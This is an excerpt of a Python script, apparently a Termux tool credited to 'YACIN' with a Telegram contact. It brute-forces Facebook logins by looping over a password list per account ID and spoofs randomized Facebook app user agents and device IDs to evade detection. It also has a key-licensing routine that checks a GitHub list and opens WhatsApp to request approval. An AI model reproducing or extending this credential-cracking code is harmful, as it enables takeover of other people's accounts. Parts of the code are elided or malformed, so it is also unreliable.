...
\033[1;37m================\033[1;37m===========\033[1;37m================
 \033[1;32m[=]\033[1;37m DEVLOPER \033[1;31m: \033[1;32mYACIN ! 
 \033[1;32m[=]\033[1;37m Telegram \033[1;31m: \033[1;32m@black_rabbit_1 !
...
def api5(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.YACIN.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.YACIN.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python DOD.py')
        tks = ('Hello%20YACIN%20Owner%20YACIN%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)

    r1 = requests.get('https://github.com/yacine3700/Chmso/blob/main/YACINE.txt').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20YCIN%20Owner%20YACIN %20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213656161329?text='+tks)
        main_apv()
main_apv()  
